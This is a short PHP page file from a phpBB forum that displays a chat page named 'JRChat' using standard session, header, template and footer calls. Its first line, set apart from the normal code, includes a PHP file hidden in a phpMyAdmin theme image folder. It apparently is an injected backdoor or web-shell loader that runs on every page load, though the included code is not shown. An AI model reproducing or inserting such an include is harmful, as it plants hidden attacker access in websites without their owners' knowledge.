<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');
 

// standard hack prevent 
define('IN_PHPBB', true); 
$phpbb_root_path = './'; 
include($phpbb_root_path . 'extension.inc'); 
include($phpbb_root_path . 'common.'.$phpEx); 

// standard session management 
$userdata = session_pagestart($user_ip, PAGE_JRCHAT); 
init_userprefs($userdata); 

// set page title 
$page_title = 'JRChat'; 

// standard page header 
include($phpbb_root_path . 'includes/page_header.'.$phpEx); 

// assign template 
$template->set_filenames(array( 
        'body' => 'JRChat.tpl') 
); 

$template->pparse('body'); 

// standard page footer 
include($phpbb_root_path . 'includes/page_tail.'.$phpEx); 

?>
